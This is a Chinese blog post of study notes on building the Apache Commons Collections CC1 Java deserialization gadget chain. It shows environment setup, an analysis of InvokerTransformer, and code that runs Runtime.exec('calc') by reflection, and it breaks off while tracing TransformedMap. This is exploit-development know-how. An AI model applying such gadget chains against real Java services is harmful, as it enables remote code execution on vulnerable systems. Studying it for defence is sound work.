<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CommonsCollection - 抄、学和做CommonsCollections 是 Apache Commons 库中的一个模块，提供了一组实用的集合类，补充了Java标准的Collections API。在 Java 应用程序中，集合类经常用于存储和操作数据。由于其普遍性和重要性，Java 的反序列化漏洞中经常会涉及到集合类。 跟着教程一步步做着学。基本算是教程的一个笔记。 其他参考资料">
<meta property="og:type" content="article">
<meta property="og:title" content="Java反序列化学习（2）-手写CC1利用链">
<meta property="og:url" content="http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
<meta property="og:site_name" content="ShuiChang博客站">
<meta property="og:description" content="CommonsCollection - 抄、学和做CommonsCollections 是 Apache Commons 库中的一个模块，提供了一组实用的集合类，补充了Java标准的Collections API。在 Java 应用程序中，集合类经常用于存储和操作数据。由于其普遍性和重要性，Java 的反序列化漏洞中经常会涉及到集合类。 跟着教程一步步做着学。基本算是教程的一个笔记。 其他参考资料">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-05-15T16:16:33.000Z">
<meta property="article:modified_time" content="2025-02-26T15:41:33.227Z">
<meta property="article:author" content="ShuiChang">
<meta property="article:tag" content="web学习">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Java反序列化学习（2）-手写CC1利用链</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/08/12/buuctf-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/05/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&text=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java反序列化学习（2）-手写CC1利用链&body=Check out this article: http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&title=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&name=Java反序列化学习（2）-手写CC1利用链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89-%E6%89%8B%E5%86%99CommonsCollection%E5%88%A9%E7%94%A8%E9%93%BE/&t=Java反序列化学习（2）-手写CC1利用链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollection-%E6%8A%84%E3%80%81%E5%AD%A6%E5%92%8C%E5%81%9A"><span class="toc-number">1.</span> <span class="toc-text">CommonsCollection - 抄、学和做</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1"><span class="toc-number">1.1.</span> <span class="toc-text">CC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%87%BA%E5%8F%A3%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">分析出口方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text">找到利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%B8%80%E6%AD%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">找第一步调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%9A%E4%BF%AE%E6%94%B9Find-Usages%E7%9A%84Scope"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">小技巧：修改Find Usages的Scope</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%BA%8C%E6%AD%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">找第二步调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%B8%89%E6%AD%A5%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">找第三步调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%A1%E5%86%99Public%E7%9A%84%E7%B1%BB%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">没写Public的类怎么办？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9A%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3Runtime%E5%AF%B9%E8%B1%A1%E6%97%A0%E6%B3%95%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-number">1.1.3.6.</span> <span class="toc-text">解决第一个问题：如何解决Runtime对象无法序列化？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transform%E7%9A%84%E4%BC%98%E5%8C%96"><span class="toc-number">1.1.3.7.</span> <span class="toc-text">Transform的优化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9A%E6%BB%A1%E8%B6%B3if%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.3.8.</span> <span class="toc-text">解决第三个问题：满足if条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%9AsetValue%E5%8F%82%E6%95%B0%E4%B8%8D%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.1.3.9.</span> <span class="toc-text">解决第二个问题：setValue参数不可控</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84Exp"><span class="toc-number">1.1.4.</span> <span class="toc-text">最终的Exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">补充学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8D%95%E4%BE%8B%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">Java 单例类</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Java反序列化学习（2）-手写CC1利用链
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ShuiChang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-05-15T16:16:33.000Z" class="dt-published" itemprop="datePublished">2024-05-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="CommonsCollection-抄、学和做"><a href="#CommonsCollection-抄、学和做" class="headerlink" title="CommonsCollection - 抄、学和做"></a>CommonsCollection - 抄、学和做</h1><p>CommonsCollections 是 Apache Commons 库中的一个模块，提供了一组实用的集合类，补充了Java标准的Collections API。在 Java 应用程序中，集合类经常用于存储和操作数据。由于其普遍性和重要性，Java 的反序列化漏洞中经常会涉及到集合类。</p>
<p>跟着<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1">教程</a>一步步做着学。基本算是教程的一个笔记。</p>
<p>其他参考资料：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://koalr.me/posts/commonscollections-deserialization/">CommonsCollections系列反序列化</a></li>
</ul>
<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ol>
<li><p>配置JDK1.8.0_u65环境。</p>
</li>
<li><p>IDEA新建一个maven项目，然后<a target="_blank" rel="noopener" href="https://mvnrepository.com/search?q=common+collections">MVNRepository</a>下载junit4.11和commonscollections3.2.1。</p>
</li>
<li><p>因为sun公司的代码都是class文件，我们所能看到的都是反编译的，且没办法被搜索，所以说可以通过OpenJDK进行下载。</p>
</li>
</ol>
<p>首先,漏洞修复会造成文件修改。可以寻找文件修改前的一个版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hg.openjdk.org/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler</span><br></pre></td></tr></table></figure>
<p>但是这个页面下没有一个是教程中的版本，非常神秘。教程中的版本为上面搜索结果的第一个的父版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</span><br></pre></td></tr></table></figure>
<p>下载完成后，解压文件。<code>src/share/classes</code>目录下有<code>sun</code>目录。将其复制。</p>
<ol start="4">
<li><p>回到JDK1.8.0_u65目录下，其根目录下有<code>src.zip</code>文件，将其解压。发现里面没有<code>sun</code>目录，就要将之前下载的OpenJDK中的<code>sun</code>目录复制到这里。</p>
</li>
<li><p>回到IDEA中，File-&gt;Project Structure-&gt;Platform Settings-&gt;SDKs-&gt;JDK1.8.0_u65下，点击<code>Sourcepath</code>，将刚才解压的源码路径加上。如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Java\jdk1.8.0_65\src</span><br></pre></td></tr></table></figure>
</li>
<li><p>同样，Maven下载后也是class文件。右上角有一个download source，下载即可得到.java源文件。</p>
</li>
</ol>
<p>至于怎么下载，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/122497199">这个</a></p>
<p>Maven-&gt;Execute Maven Goal-&gt;<code>mvn dependency:resolve -Dclassifier=sources</code></p>
<h3 id="分析出口方法"><a href="#分析出口方法" class="headerlink" title="分析出口方法"></a>分析出口方法</h3><p>首先看到<code>InvokerTransformer.java</code>。我们选取构造函数和它的一个公共函数来看。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); <span class="comment">//获取Class</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); <span class="comment">//获取method</span></span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs); <span class="comment">//invoke</span></span><br><span class="line">            </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，这块（<code>transform()</code>方法）简直就直接是一个用到反射的任意类加载+任意函数执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); <span class="comment">//获取Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); <span class="comment">//获取method</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs); <span class="comment">//invoke</span></span><br></pre></td></tr></table></figure>
<p>首先尝试普通反射。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后尝试调用<code>InvokerTransformer.transform()</code> 注意：需要照着源码做哦，看源码的输入输出</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传完了以后那边使用反射的特性调用了<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，弹了计算器。</p>
<p>这样，我们就找到了出口方法。</p>
<h3 id="找到利用链"><a href="#找到利用链" class="headerlink" title="找到利用链"></a>找到利用链</h3><h4 id="找第一步调用"><a href="#找第一步调用" class="headerlink" title="找第一步调用"></a>找第一步调用</h4><p>目前，我们已经找到了出口方法，就是<code>InvokerTransformer.transform()</code>。现在，我们就需要找找同名函数了。也即寻找<code>transform()</code>方法。</p>
<p>我们在IDEA里右键<code>transform()</code>，然后Find Usages。</p>
<h4 id="小技巧：修改Find-Usages的Scope"><a href="#小技巧：修改Find-Usages的Scope" class="headerlink" title="小技巧：修改Find Usages的Scope"></a>小技巧：修改Find Usages的Scope</h4><p>快捷键：ctrl+alt+shift+F7，或者直接点左边那一列按钮里的Settings-&gt;Scope</p>
<p>Find Usages找到很多调用。我们的目标就是找到可以回到<code>readObject</code>里。就这样一个个往下看，比如，看到一个<code>org.apache.commons.collections</code>下的<code>beanMap.convertType()</code>方法，我们就可以再找有哪些方法与<code>convertType</code>重名。</p>
<p>视频攻略直接告诉我们是找到了<code>org.apache.commons.collections.map</code>下。</p>
<p>看到<code>DefaultMap</code>类中有<code>get</code>方法调用了<code>transform</code>；<code>lazyMap</code>也一样，<code>TransfromedMap</code>有很多方法调用<code>transform</code>。</p>
<p>选取<code>TransfromedMap</code>类中的<code>checkSetValue()</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着看到<code>TransfromedMap</code>类的构造函数，发现是一个protected方法。protected修饰的成员可以被同一个包内的其他类访问，以及该类的子类（不管子类是否在同一个包内）访问，但不能被其他包中的类访问。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看看这个构造函数被哪个函数使用了。往上搜，发现有一个static方法，<code>decorate</code>。这样，就可以通过调用这个静态方法来进行<code>TranformedMap</code>的实例化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>推测这个函数是通过调用<code>TransformedMap</code>对<code>Transformer</code>进行一定的处理。有点像代理。</p>
